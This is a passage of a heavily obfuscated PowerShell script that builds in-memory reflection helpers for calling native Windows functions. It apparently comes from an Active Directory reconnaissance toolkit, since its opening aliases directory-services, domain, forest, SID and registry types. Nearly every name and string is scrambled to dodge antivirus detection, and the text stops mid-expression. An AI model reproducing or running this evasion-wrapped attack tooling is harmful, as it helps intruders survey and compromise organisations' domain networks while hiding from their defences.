 ${yl`RJ}=[tyPe]("{1}{0}"-f'id','gu');  &('SV')  ('Lk'+'Y')  (  [tYpE]("{7}{2}{11}{9}{1}{5}{6}{10}{4}{8}{0}{3}"-f 'IO','o','Nt','n','vIces.CalLinG','PS','e','Runtime.i','COnveNt','R','R','E') )  ;  &('sv')  ('b'+'7IE') (  [tYPe]("{1}{2}{3}{5}{0}{4}" -F'vICES.c','rUNTiME.In','TERoP','S','harset','Er') ) ; ${e`LZR}  =[tYPE]("{2}{0}{8}{6}{4}{10}{1}{5}{3}{7}{9}" -F 'u','.d','R','porTA','PsERVI','LLIM','.iNtERO','TTRibuT','ntime','E','ceS') ;   &('SV')  ('a'+'lNtV')  (  [type]("{2}{3}{0}{1}" -f'AGsAttr','IBUte','F','L') );    ${6yZ`Qg}  =[tYpe]("{5}{1}{3}{4}{0}{2}" -f'Mit.PACKinGSI','lE','Ze','CTioN','.e','rEF');&('SV')  ("{0}{1}" -f'b','3sR')  (  [TypE]("{1}{0}{4}{3}{2}" -F 'cTiO','REFle','UtES','atTRib','n.TypE'));    &('SV') ('Kie'+'0UA') ( [tyPe]("{2}{11}{3}{7}{1}{0}{9}{5}{10}{6}{4}{8}"-F'te','N','rU','IME.','TribUT','S.maR','t','i','e','rOPsERvICe','SHaLaSA','nt')) ;   &("{1}{2}{0}"-f 'ItEm','Set','-') ("VA"+"rI"+"aBle:U"+"1VPKQ") (  [tYPE]("{1}{0}"-f'yPe','t') ) ;  &('sv') ("9t"+"1V") ( [tYPe]("{1}{5}{2}{4}{3}{0}" -f 'eS','ReflECTion.E','t','Od','.OpC','mi')) ;   &("{0}{1}{2}"-f's','eT','-ITeM') ("VAriA"+"BLe:x2"+"Yp")  ([typE]("{1}{2}{0}" -F 'h','IO.P','at'));   ${9`R3`xkV}=[TYpE]("{3}{2}{1}{0}"-F 'FiLE','O.','TEm.I','SyS')  ; &("{2}{1}{0}" -f 'eM','T','Set-i') ("vArIAb"+"l"+"e:C"+"u2lV3")  ( [TyPe]("{2}{3}{4}{0}{1}"-f'o.FIlEM','odE','Sys','TEm','.I')  ) ;  ${lv`D`A6F} =  [tYpe]("{4}{1}{5}{0}{2}{3}"-F 'FI','M.iO','Le','AccEss','sySTE','.')  ; &('SV') ("{1}{0}"-f 'qh','F') ( [TyPe]("{0}{3}{2}{1}" -F 'iO','Are','sH','.FiLe')) ;   &("{1}{2}{0}" -f 'iABle','seT-V','Ar')  ("{1}{0}" -f'j','5L3c')  ( [tYPE]("{1}{0}" -f'DNs','NEt.') );  ${q`K2} =[typE]("{1}{2}{0}"-F 'Or','Ac','tIvat') ;    ${f4`lx}  =  [tYPe]("{3}{2}{6}{0}{5}{4}{1}" -f 'Eadi','hreAd','.T','SYstEm','g.t','N','hR') ;   ${sH`cY`l1}  =[TYPE]("{2}{0}{3}{4}{1}" -F'eCtIon','Bly','refl','.','asSEm')  ;&('SV') ('jc61'+'d')  (  [TypE]("{3}{1}{2}{0}" -f 'iTCONveRTER','s','TEm.B','sY'))  ;   &('sV') ('7'+'gXJ') ( [TYPE]("{4}{1}{3}{0}{2}{5}" -F '.BiNdIN','SteM.Re','GFLAG','flEctION','sy','s') ); &('sV')  ("1lh"+"s") ([TYPe]("{0}{8}{3}{6}{7}{4}{2}{1}{5}" -F 'SYsTEM.Dir','O','I','ry','t','n','seRviCES.rEFErrALc','hasINGop','EcTo')  ); &('sV')  ("{0}{1}"-f'U','wd')  (  [TyPe]("{6}{2}{5}{1}{4}{0}{3}" -f'vIcES.SecUrItyMa','DireCTOrY','ste','sKs','sER','m.','SY')) ;  &("{0}{2}{1}"-f 'SEt-I','M','tE')  ("{0}{2}{1}" -f 'vArIAb','C','le:yK') ( [tYPE]("{1}{0}" -F 'rAY','ar'));  &("{0}{1}" -f'Set-ItE','M') ('vaRIA'+'b'+'l'+'e:4fb0e') (  [tyPe]("{0}{2}{1}"-f'sYSTEm.CO','t','Nver') )  ; &("{1}{0}" -f '-ITem','set')  ("{1}{0}{2}"-f'iABLE:C','VaR','kzO')  (  [TYPE]("{2}{1}{4}{0}{6}{5}{8}{7}{10}{9}{3}"-f'YSeR','eM.DI','SYST','ain','recTOr','Ces.A','VI','vedIR','cTi','rY.dOM','eCto') );   ${e`6A0}=  [tyPe]("{0}{1}"-F'c','onVErT')  ;&("{0}{1}" -f'Se','T')  ("{0}{1}"-f 'CJi6','K1')  ( [type]("{0}{1}" -f 'ENU','m')) ;  ${q6r`Hsu}=  [tYPE]("{3}{2}{1}{0}"-F'Rter','VE','oN','BItc') ;   &("{1}{0}{2}" -f 'I','SET-','TEM') ('v'+'AriA'+'BL'+'E:Y94') ( [TyPE]("{0}{2}{1}{3}{4}{5}" -f 'S','stem.te','Y','xt.EN','Co','DING') ) ;  &("{0}{1}{2}" -f 's','ET-IT','em')  ("{2}{1}{0}"-f 'e2P','ablE:','VARI') ( [TYPe]("{3}{1}{4}{2}{5}{6}{0}"-f 'S','T','M.StrI','syS','e','nGsp','liToptIon')  )  ; &("{1}{0}{2}"-f'ET-ITe','s','M')  ('v'+'ARIablE:S'+'1'+'t06Y') ([tyPE]("{1}{0}" -F 'x','ReGE'))  ;    &("{0}{2}{1}"-f'S','tEm','eT-i') ("VAria"+"BLe"+":cE1m")  ([TYpe]("{1}{0}{5}{4}{2}{3}"-f'OsoFt.wiN32','mICr','s','tryKeY','REgi','.'))  ;   &("{2}{1}{0}" -f 'ITEM','et-','s') ("{3}{0}{2}{1}"-f'Ar',':1t2n','iABLE','V') (  [tYpE]("{6}{1}{3}{4}{5}{0}{7}{8}{2}"-f'S','S','rsHAL','TeM.rUnTIMe.iNtEr','oPServ','ice','sY','.M','A')  )  ;   ${8`gS} =[TypE]("{1}{0}"-f'o.fIlE','I') ; &("{0}{1}" -f'se','t')  ('tL1'+'K38')  ( [TYPe]("{5}{11}{14}{13}{0}{7}{10}{2}{4}{6}{15}{9}{12}{8}{3}{1}"-F 'M','stATE','tomaTiO','ion','n.Ru','sYs','NSPa','En','S','niTialse','T.aU','TeM.MAn','S','e','Ag','cES.I') ) ;  &('Sv')  ("{0}{1}" -f '3a','D')  ( [TYPe]("{2}{6}{5}{7}{0}{3}{1}{4}" -F'adi','Me','sY','ng.aPART','nTstATe','m.','StE','tHrE') )  ; &('SV')  ("GnOX"+"5p") ([tYPe]("{1}{0}{2}"-F 'AceFacTO','RuNsp','rY') );  &("{1}{2}{0}"-f 'tEm','sE','t-I')  ("varIA"+"bLe"+":yf1T") (  [Type]("{0}{1}{2}" -f 'POwER','sH','ell') );   ${b`9u}  = [tYpE]("{0}{1}{2}{3}"-F 'enV','iR','on','mEnT');   ${a`d1}  = [tyPe]("{2}{1}{0}{3}" -F'nEt.d','em.','Syst','NS');  &("{0}{2}{1}" -f'Se','ITEm','t-') ('v'+'a'+'rIaBLE:0do') ( [tYPe]("{1}{2}{0}" -f 'e','daTetI','m')  ); ${X`J`qN7} = [TyPe]("{0}{2}{1}{3}" -F'i','ec','O.DiR','TORy') ;  &("{0}{1}" -f'set','-ItEm')  ('vaRIabL'+'e:'+'7l35f') ( [tyPE]("{5}{1}{4}{3}{2}{0}{6}"-f'LKNOWNSiD','Y','paL.wEL','secUrITy.PriNCi','sTEM.','s','tYPe') );  &("{1}{0}"-f'T','SE') ("{0}{1}" -f'dur','8')  (  [TYPe]("{6}{1}{0}{7}{2}{5}{3}{4}"-F'Ime.inTero','nT','sERVICEs','AR','sHAL','.m','RU','P')  )  ;  &("{0}{2}{1}" -f's','TEm','ET-I') ("{1}{0}{2}"-f 'E','vARiaBlE:PKF','zn')  ([tyPE]("{6}{3}{0}{2}{5}{4}{8}{1}{9}{7}{10}" -F'M','Ion','E','Ge','.aUToM','nt','MAna','rED','At','.pSc','EntiaL'))  ;  &('sV') ("{1}{0}" -f'RY','x')  ([tYpe]("{7}{3}{2}{4}{0}{1}{6}{5}"-F'sErVIcE','s.','ecTo','M.dir','rY','REcToRY.FOrEst','acTiVEdi','SysTE') )  ;    &("{1}{0}{2}" -f'T','SE','-ITEm') ("{0}{3}{2}{1}" -f'VA','5x','Le:zT','RIaB') ([TypE]("{0}{1}" -F 'S','tRINg')  ) ;  &("{0}{2}{1}" -f's','E','eT-VARiABl')  ('HdI'+'cU') ([tYpE]("{1}{0}"-F 'TPTR','iN') )  ;  &("{0}{3}{2}{1}"-f 'S','iABLE','ar','eT-V')  ("{1}{0}"-f'1ZuK','Hi') (  [tYpE]("{0}{1}"-F'iNT3','2') )  ;function nE`W-INmeM`oRy`M`ODULe {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{5}{2}{7}{0}{4}{6}{1}{8}" -f 'ateCha','uncti','ldProcessF','PS','ngin','UseShou','gF','orSt','ons'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(poSItiON = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Mod`U`leN`AmE} =   (  &('gI')  ("V"+"ARiabL"+"E:yL"+"rJ"))."va`luE"::("{0}{2}{1}" -f 'N','wGuid','e').Invoke().("{2}{0}{1}"-f'tr','ing','ToS').Invoke()
    )

    ${A`PPdoMa`iN} =   ( &("{1}{0}{2}{3}"-f'cHi','gET-','LDI','tEm')  ("VaR"+"iAbLe:sHC"+"y"+"l1"))."Val`UE"."asse`M`BlY".("{1}{2}{0}"-f 'ype','G','etT').Invoke(("{2}{1}{3}{0}{4}" -f 'p','em','Syst','.Ap','Domain')).("{0}{1}{2}" -f 'GetProp','er','ty').Invoke(("{0}{1}{2}"-f 'C','urrent','Domain')).("{2}{1}{0}" -f'lue','a','GetV').Invoke(${N`ULl}, @())
    ${L`O`A`dedasS`E`mBlieS} = ${App`do`Ma`IN}.("{2}{0}{1}"-f'et','Assemblies','G').Invoke()

    foreach (${A`sSEm`BlY} in ${loaDEda`s`s`eM`B`LiES}) {
        if (${As`sE`mBLY}."FUl`lNA`ME" -and (${a`S`seMBLY}."fulL`Na`me".("{0}{1}" -f 'Spl','it').Invoke(',')[0] -eq ${m`oD`UlenAme})) {
            return ${aSsEm`B`LY}
        }
    }

    ${dyN`Ass`EMBlY} = &("{3}{2}{0}{1}"-f'Obj','ect','-','New') ("{5}{0}{2}{4}{3}{1}{6}"-f 'fle','Na','ction.','embly','Ass','Re','me')(${MoD`ULeNa`me})
    ${D`om`AIN} = ${app`dO`Main}
    ${aSsE`M`BlyBUI`LD`er} = ${DOM`AIN}.("{4}{3}{5}{2}{0}{6}{1}"-f 'na','y','Dy','fi','De','ne','micAssembl').Invoke(${dy`Na`sse`mbLY}, 'Run')
    ${MOdUL`ebui`LdeR} = ${A`SseMb`Lyb`UIl`DeR}.("{3}{2}{0}{1}" -f'ynamicMo','dule','efineD','D').Invoke(${MoD`UlE`Na`mE}, ${fAl`SE})

    return ${M`OdU`L`ebuIL`deR}
}

function F`Unc {
    Param (
        [Parameter(PoSITIOn = 0, MaNDaTorY = ${t`Rue})]
        [String]
        ${D`Ll`NAMe},

        [Parameter(PoSItiON = 1, MaNDaTOrY = ${t`RuE})]
        [string]
        ${FuNCT`I`onN`AME},

        [Parameter(posItIon = 2, MANDAtorY = ${T`RUe})]
        [Type]
        ${retu`RN`TYpE},

        [Parameter(PosiTION = 3)]
        [Type[]]
        ${PARAM`ETeRT`y`PeS},

        [Parameter(PoSitioN = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${N`A`T`IVecALl`I`NGcONV`entIon},

        [Parameter(POSiTION = 5)]
        [Runtime.InteropServices.CharSet]
        ${C`hARS`eT},

        [String]
        ${e`Nt`RyP`oINt},

        [Switch]
        ${sE`TLA`sTEr`R`oR}
    )

    ${pRo`Pe`RtIes} = @{
        ("{0}{1}" -f'Dll','Name') = ${DL`LnAME}
        ("{1}{2}{3}{0}" -f'nName','Fun','c','tio') = ${fun`C`T`I`ONName}
        ("{2}{0}{1}" -f'turnT','ype','Re') = ${reTu`Rn`TYPe}
    }

    if (${Para`M`Ete`RTyP`es}) { ${PR`Op`ert`iEs}[("{3}{1}{4}{0}{2}"-f'e','a','s','Par','meterTyp')] = ${p`ArAmEtER`TyPEs} }
    if (${naTivEC`Al`li`N`G`CONVENti`On}) { ${pr`oper`Ti`ES}[("{3}{4}{0}{1}{2}{5}" -f 'ngCon','v','ent','NativeCal','li','ion')] = ${NAt`I`VEca`LlIngCOn`VeNt`ioN} }
    if (${c`haR`Set}) { ${PR`oPerT`ieS}[("{0}{1}{2}"-f 'Ch','ars','et')] = ${ch`AR`seT} }
    if (${sEtla`sT`e`Rr`OR}) { ${Pr`OP`e`RTiES}[("{0}{1}{2}{3}" -f 'Se','tLast','Err','or')] = ${SETLA`STeRr`or} }
    if (${eN`TRYPo`I`NT}) { ${pr`op`e`RTIeS}[("{1}{2}{0}" -f 'yPoint','E','ntr')] = ${eNTRY`p`OINT} }

    &("{2}{0}{3}{1}"-f'bj','ct','New-O','e') ("{1}{2}{0}"-f't','P','SObjec') -Property ${pr`Op`ER`Ties}
}

function Ad`D-wiN32Ty`PE{
    [OutputType([Hashtable])]
    Param(
        [Parameter(manDATOrY=${T`Rue}, ValuefROMpipElInEbYProPERtYNaMe=${t`RuE})]
        [String]
        ${d`L`LNaME},

        [Parameter(MaNDATORY=${t`RUe}, ValuefromPiPeliNEByPRoPErtYNAmE=${T`Rue})]
        [String]
        ${fU`N`cTIO`NNAME},

        [Parameter(VALUefromPIpeLineByPropertYNAMe=${tr`Ue})]
        [String]
        ${E`N`TrypOiNt},

        [Parameter(MANdaToRy=${tr`UE}, valuEfroMpIpElInEByPRoPErTynaMe=${Tr`Ue})]
        [Type]
        ${r`eTuRnt`YPE},

        [Parameter(VAlUeFroMpipELiNeBypRoPERtYnAme=${T`RUE})]
        [Type[]]
        ${pA`R`A`ME`TErtYpEs},

        [Parameter(vaLUefrOmpIpElinEBypropErtYnamE=${TR`UE})]
        [Runtime.InteropServices.CallingConvention]
        ${NA`Tivec`A`llIn`GcoNve`NTi`ON} =   (  &("{0}{1}" -f 'Gc','I')  ('var'+'IaBL'+'E:L'+'KY'))."vaL`UE"::"STD`CaLl",

        [Parameter(VAlueFrOMPIPELIneBYpRopeRTYnAmE=${T`RUE})]
        [Runtime.InteropServices.CharSet]
        ${CHa`RS`Et} =  (  &("{0}{1}" -f'dI','r')  ('v'+'aRI'+'ABLe:B'+'7Ie')  )."V`ALue"::"Au`To",

        [Parameter(vALuEFRompIpElIneBYPRoPerTynAme=${t`RuE})]
        [Switch]
        ${Se`TL`AsTERR`or},

        [Parameter(MANdaToRY=${T`RUE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`D`ULe},

        [ValidateNotNull()]
        [String]
        ${nam`eS`p`Ace} = ''
    )

    BEGIN
    {
        ${t`YPEha`SH} = @{}
    }

    PROCESS
    {
        if (${MoDu`LE} -is [Reflection.Assembly])
        {
            if (${n`Ames`paCE})
            {
                ${Ty`pE`hAsH}[${dLl`N`AMe}] = ${M`O`DULe}.("{0}{1}{2}"-f'Ge','t','Type').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${T`yp`eHa`sh}[${DL`L`NAME}] = ${mo`D`ULE}.("{1}{0}{2}"-f 'yp','GetT','e').Invoke(${dl`LNaME})
            }
        }
        else
        {

            if (!${TY`pEHa`sh}.("{1}{2}{0}{3}" -f 'insKe','Cont','a','y').Invoke(${dlL`NA`Me}))
            {
                if (${n`Ame`SpAcE})
                {
                    ${tYPEh`A`Sh}[${Dll`Na`Me}] = ${m`oD`ULe}.("{1}{0}{3}{2}"-f 'ineT','Def','e','yp').Invoke("$Namespace.$DllName", ("{2}{5}{0}{3}{1}{4}{6}"-f'lic,','eFiel','P','Befor','d','ub','Init'))
                }
                else
                {
                    ${T`yp`Eh`Ash}[${D`Llna`Me}] = ${mod`UlE}.("{0}{1}{2}"-f 'Defin','eTyp','e').Invoke(${DL`LN`Ame}, ("{4}{1}{0}{3}{2}" -f 'ic,Befor','ubl','dInit','eFiel','P'))
                }
            }

            ${MEt`H`od} = ${Ty`pEHA`Sh}[${d`LL`NAMe}].("{2}{1}{0}" -f 'thod','Me','Define').Invoke(
                ${Fun`cTI`oNnAmE},
                ("{3}{2}{4}{1}{5}{6}{0}" -f 'l','P','ublic,','P','Static,','in','vokeImp'),
                ${Re`TUR`NT`YPE},
                ${pArAm`EteR`T`YPeS})

            ${i} = 1
            foreach(${P`A`RaME`TeR} in ${pARAm`E`T`ER`TyPeS})
            {
                if (${pAra`m`ETER}."ISB`Yr`eF")
                {
                    [void] ${meTh`oD}.("{2}{0}{4}{3}{1}"-f 'a','r','DefinePar','e','met').Invoke(${i}, 'Out', ${n`Ull})
                }

                ${i}++
            }

            ${dLL`ImP`oRT} = [Runtime.InteropServices.DllImportAttribute]
            ${SeTL`Ast`E`RRO`RfIELD} = ${dlLi`Mp`oRt}.("{1}{0}"-f 'ield','GetF').Invoke(("{0}{1}{3}{2}" -f'SetL','astE','r','rro'))
            ${C`A`L`LiNgCON`VE`NTionF`IE`Ld} = ${D`L`lImPOrt}.("{1}{0}{2}"-f't','Ge','Field').Invoke(("{3}{2}{1}{0}"-f'tion','Conven','ling','Cal'))
            ${C`HArs`et`FiELD} = ${d`ll`imp`orT}.("{1}{0}" -f'Field','Get').Invoke(("{1}{0}" -f'et','CharS'))
            ${eN`T`RypOIntF`Ie`Ld} = ${dlLIM`PO`Rt}.("{1}{0}"-f'ld','GetFie').Invoke(("{0}{1}{2}" -f'E','ntryPoin','t'))
            if (${SE`TL`AsT`ER`Ror}) { ${S`l`EVAlUe} = ${tR`UE} } else { ${Sle`Va`Lue} = ${Fa`LSe} }

            if (${PSBoUnDP`ARAm`eT`e`Rs}[("{2}{1}{0}"-f'int','Po','Entry')]) { ${ExPor`TeDFun`C`NamE} = ${e`NTRYPoi`NT} } else { ${Expo`Rt`EdF`UncnAme} = ${fUncT`iONna`ME} }

            ${cO`NstrU`cT`OR} =  ( &("{1}{0}{3}{2}"-f'Et-v','G','IabLE','AR') ("El"+"Zr") -VaLUEo  )."g`et`COn`s`TRUcTOR"([String])
            ${DLL`IMPo`RtaT`T`RIb`UTe} = &("{3}{0}{2}{1}" -f 'O','ct','bje','New-') ("{4}{2}{10}{0}{7}{6}{3}{1}{8}{9}{11}{5}"-f'ion','omAttribu','efl','t','R','r','it.Cus','.Em','teB','ui','ect','lde')(${CoNs`T`R`UctoR},
                ${dLL`N`AmE}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${s`eTl`A`St`ErRorfield},
                                           ${C`Al`LINGCO`NVENTI`OnfiE`lD},
                                           ${C`HA`RS`Et`FIEld},
                                           ${en`T`R`yp`OInTf`iElD}),
                [Object[]] @(${SleV`Al`Ue},
                             ([Runtime.InteropServices.CallingConvention] ${N`AtiVE`CaLLiNGCO`NV`ENtion}),
                             ([Runtime.InteropServices.CharSet] ${ChAr`SEt}),
                             ${eXP`ORT`EDfuNC`Na`ME}))

            ${mE`T`Hod}.("{5}{2}{3}{1}{0}{4}"-f'tri','At','etCus','tom','bute','S').Invoke(${dl`liMPORtat`TRi`BU`Te})
        }
    }

    END
    {
        if (${M`OD`UlE} -is [Reflection.Assembly])
        {
            return ${TYpE`H`ASH}
        }

        ${r`EtuR`NTYpeS} = @{}

        foreach (${K`eY} in ${Ty`pEh`ASh}."ke`Ys")
        {
            ${T`YPE} = ${tY`P`eHaSH}[${K`ey}].("{0}{2}{1}"-f'C','Type','reate').Invoke()

            ${REt`UR`NTyp`Es}[${K`eY}] = ${ty`pE}
        }

        return ${ReT`Ur`NTYp`eS}
    }
}

function pSen`UM {
    [OutputType([Type])]
    Param (
        [Parameter(POSITioN = 0, mandatOrY=${T`Rue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mod`ULE},

        [Parameter(POsitiON = 1, maNDaToRY=${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`ULLn`AmE},

        [Parameter(posiTIOn = 2, mandATory=${tr`Ue})]
        [Type]
        ${Ty`Pe},

        [Parameter(poSItioN = 3, ManDATory=${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${EnU`Me`leMenTs},

        [Switch]
        ${BIT`FiELD}
    )

    if (${m`o`dulE} -is [Reflection.Assembly])
    {
        return (${M`odU`Le}.("{1}{0}{2}" -f'y','GetT','pe').Invoke(${Full`N`Ame}))
    }

    ${EN`UM`Type} = ${Ty`PE} -as [Type]

    ${e`Nu`mb`UILdER} = ${Mo`D`UlE}.("{2}{1}{0}{3}" -f 'E','e','Defin','num').Invoke(${F`Ulln`AMe}, ("{1}{0}"-f'lic','Pub'), ${ENu`M`TyPe})

    if (${bITF`Ie`ld})
    {
        ${Fl`AgSConS`T`RUCtOr} =   (&("{2}{0}{1}"-f'rIABl','E','VA') ('a'+'LNtV') )."V`ALUE"."GetC`O`NSt`RUCtOr"(@())
        ${flA`GSCU`STOmat`T`Ri`B`UTe} = &("{2}{0}{1}" -f'-Obj','ect','New') ("{7}{9}{8}{0}{1}{5}{6}{3}{2}{10}{4}"-f'it.','Cu','e','mAttribut','lder','st','o','Re','ion.Em','flect','Bui')(${F`lAGsCo`NStRuc`T`Or}, @())
        ${enu`MbUI`ldER}.("{3}{1}{0}{4}{2}" -f 'ustom','etC','bute','S','Attri').Invoke(${fLa`GScUs`ToMAt`T`Rib`UtE})
    }

    foreach (${K`eY} in ${eNuMeLeM`en`TS}."k`EyS")
    {

        ${N`Ull} = ${ENUmB`UiL`DER}."d`EFi`Nel`ITer`Al"(${k`ey}, ${e`NUm`ElE`MEnTs}[${k`eY}] -as ${eNu`MT`ype})
    }

    ${E`NuMBuI`l`dER}.("{0}{1}{2}" -f'C','r','eateType').Invoke()
}

function fi`eLd {
    Param (
        [Parameter(POSitioN = 0, MANdATorY=${t`RuE})]
        [UInt16]
        ${POsIt`i`ON},

        [Parameter(PosITiOn = 1, mANDatOrY=${T`RuE})]
        [Type]
        ${tY`PE},

        [Parameter(poSitION = 2)]
        [UInt16]
        ${OF`FS`ET},

        [Object[]]
        ${mArsh`A`L`As}
    )

    @{
        poSitiON = ${poS`it`iON}
        ("{1}{0}"-f 'ype','T') = ${tY`PE} -as [Type]
        ("{0}{1}"-f 'Of','fset') = ${oF`FsET}
        ("{2}{1}{0}"-f 's','halA','Mars') = ${MArSHA`L`AS}
    }
}

function STR`Uct
{

    [OutputType([Type])]
    Param (
        [Parameter(PoSItIoN = 1, ManDaTOrY=${tr`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mO`DU`lE},

        [Parameter(pOsITioN = 2, MAnDAtoRy=${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`Ul`LNAMe},

        [Parameter(PoSITIon = 3, MANDatORy=${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${stR`Uct`FIelDs},

        [Reflection.Emit.PackingSize]
        ${PaC`kINGs`izE} =  (  &("{0}{1}" -f 'D','iR')  ('vaR'+'i'+'aB'+'lE:6Yzqg') )."v`ALuE"::"uN`spECiF`iEd",

        [Switch]
        ${EX`Pl`ICi`TlA`yOUT}
    )

    if (${moD`U`lE} -is [Reflection.Assembly])
    {
        return (${mOd`ULE}.("{1}{0}" -f'ype','GetT').Invoke(${f`Ul`l`Name}))
    }

    [Reflection.TypeAttributes] ${S`Tr`U`cta`TTriBUT`eS} = ("{4}{11}{1}{10}{13}{20}{0}{5}{6}{18}{8}{16}{17}{21}{7}{22}{15}{14}{19}{12}{2}{3}{9}"-f' ','   ','dI','ni','AnsiCla','Pub','l','Sealed,','c,','t','    Cl','ss,
 ','Fiel','ass,','   Befo','     ','
 ',' ','i','re','
       ','      ','
')

    if (${eX`p`l`iciTlay`OuT})
    {
        ${sTRUcTa`TTRI`B`UTes} = ${S`TRuC`T`Att`RiButes} -bor   ( &("{0}{1}" -f 'ite','M') ('VarIA'+'BL'+'e:'+'b3SR')  )."VAL`UE"::"eXpLiC`I`TLay`ouT"
    }
    else
    {
        ${S`TR`UCt`ATT`RibUTeS} = ${S`T`RUCTATTR`iBU`TEs} -bor   (  &("{2}{1}{0}"-f 'e','aRiaBl','V')  ("{1}{0}" -f 'R','B3s'))."VA`lue"::"seQue`NTIa`llaYoUt"
    }

    ${STr`UCtBUiLD`ER} = ${m`odule}."de`F`INe`TyPE"(${fUl`LnaME}, ${s`TruCt`A`Ttr`IbutES}, [ValueType], ${PaCkiNgS`I`Ze})
    ${c`O`N`sT`RUc`TorinFO} =  ( &("{2}{0}{1}"-f 'tE','m','get-I') ("VaRIAB"+"Le:"+"k"+"IE0ua")  )."v`ALuE".("{0}{1}{2}"-f 'GetCon','struc','tors').Invoke()[0]
    ${SIZec`on`sT} = @( (  &("{0}{2}{1}"-f 'Va','e','RIabl')  ('kiE'+'0uA') -VA  ).("{1}{2}{0}" -f'eld','Get','Fi').Invoke(("{1}{0}{2}" -f'ns','SizeCo','t')))

    ${Fi`e`lDs} = &("{2}{1}{0}" -f'ct','e','New-Obj') ("{1}{0}{2}" -f 'asht','H','able[]')(${struc`TFIE`lDS}."Co`UNT")

    foreach (${Fi`e`lD} in ${sT`RuC`T`Fields}."ke`Ys")
    {
        ${I`NdEx} = ${strU`Ctfi`el`DS}[${fi`E`LD}][("{2}{0}{1}" -f 'sitio','n','Po')]
        ${f`iE`lds}[${in`d`eX}] = @{("{1}{0}{2}"-f 'a','FieldN','me') = ${Fie`Ld}; ("{1}{0}{2}{3}" -f't','Proper','i','es') = ${S`TRUC`TFI`ELdS}[${FI`e`LD}]}
    }

    foreach (${F`IeLd} in ${fIe`l`ds})
    {
        ${fieLd`NA`Me} = ${fIE`ld}[("{2}{1}{0}"-f 'ame','ldN','Fie')]
        ${fIE`LDPR`OP} = ${fi`eLd}[("{2}{0}{3}{1}"-f'pe','s','Pro','rtie')]

        ${oFF`sEt} = ${f`iELd`pR`oP}[("{1}{0}" -f 'fset','Of')]
        ${Ty`pe} = ${F`IELDpR`op}[("{1}{0}" -f'pe','Ty')]
        ${MARSh`AL`AS} = ${f`i`e`LDprop}[("{2}{1}{3}{0}" -f 'halAs','a','M','rs')]

        ${n`Ew`Fie`LD} = ${strUc`T`BU`IlDER}.("{2}{3}{0}{1}"-f'eF','ield','D','efin').Invoke(${fIEL`DNA`Me}, ${T`YPe}, ("{0}{1}"-f 'Pub','lic'))

        if (${mA`RS`hA`Las})
        {
            ${UNManAg`EdT`y`Pe} = ${M`ARshal`As}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${ma`R`shALaS}[1])
            {
                ${sI`zE} = ${M`A`RSHaL`As}[1]
                ${a`TtR`ibbUIlder} = &("{1}{0}{2}"-f'w-Obj','Ne','ect') ("{5}{4}{8}{3}{1}{9}{0}{10}{7}{2}{6}" -f 'stomAt','C','e','.','efl','R','r','eBuild','ection.Emit','u','tribut')(${cON`sTrucTorI`N`FO},
                    ${UNMANa`G`EdT`y`Pe}, ${S`iZEc`oNSt}, @(${S`iZe}))
            }
            else
            {
                ${a`TT`RibbuiLder} = &("{1}{2}{0}"-f't','Ne','w-Objec') ("{5}{9}{1}{2}{3}{0}{8}{10}{4}{7}{6}"-f'ustomA','o','n.','Emit.C','u','Refl','er','ild','ttrib','ecti','uteB')(${Const`Ru`C`T`ORin`FO}, [Object[]] @(${U`Nma`NAG`edTYPE}))
            }

            ${n`E`wFIE`LD}.("{1}{3}{0}{4}{2}" -f 'stomAttr','Set','bute','Cu','i').Invoke(${AtT`RI`Bbui`lD`eR})
        }

        if (${EXpLIc`ItlAyo`Ut}) { ${Ne`WF`iELd}.("{0}{1}{2}" -f 'S','etO','ffset').Invoke(${oF`FSeT}) }
    }

    ${SiZ`EME`THOD} = ${StRuC`T`BuiLdeR}.("{2}{1}{0}"-f'Method','e','Defin').Invoke(("{0}{1}"-f'Ge','tSize'),
        ("{0}{1}{2}" -f'Publi','c',', Static'),
        [Int],
        [Type[]] @())
    ${ILGE`Ne`RA`ToR} = ${SIZe`M`et`HoD}.("{1}{2}{0}{3}" -f'ne','GetIL','Ge','rator').Invoke()
    ${ilG`eNE`RAtOr}.("{0}{1}" -f 'Emi','t').Invoke(  ( &("{0}{2}{1}" -f'vAriA','le','b')  ("{0}{1}"-f'9T','1v')  -vALuEONlY )::"ldT`O`KeN", ${s`TrU`CtB`UiLdER})
    ${ILG`EN`E`RaTOr}.("{0}{1}"-f'Emi','t').Invoke(  (  &("{0}{2}{1}" -f 'GE','-vARIabLe','t')  ("{0}{1}"-f '9t1','v') -valUeoNl  )::"ca`lL",
          ${U`1VPKQ}.("{0}{1}{2}" -f 'GetM','eth','od').Invoke(("{1}{0}{4}{3}{2}" -f 'p','GetTy','dle','FromHan','e')))
    ${ilg`eNERA`Tor}.("{0}{1}"-f 'Em','it').Invoke(  ${9`T1V}::"C`ALL",
         ${D`Ur8}.("{1}{0}{2}" -f 'e','GetM','thod').Invoke(("{1}{0}"-f'eOf','Siz'), [Type[]] @([Type])))
    ${iL`G`EN`EraTOr}.("{0}{1}"-f 'Emi','t').Invoke( ( &("{1}{2}{3}{0}"-f'ABle','gET','-vAr','I')  ('9t'+'1v'))."va`LUE"::"r`eT")

    ${i`mplIcit`CONver`TEr} = ${S`TrucTBu`ilD`er}.("{2}{0}{1}{3}" -f'e','t','DefineM','hod').Invoke(("{2}{0}{1}"-f 'Impl','icit','op_'),
        ("{1}{7}{3}{10}{8}{0}{5}{2}{9}{6}{4}" -f'c, ','PrivateS','ideB','e, ','pecialName','Static, H',' S','cop','li','ySig,','Pub'),
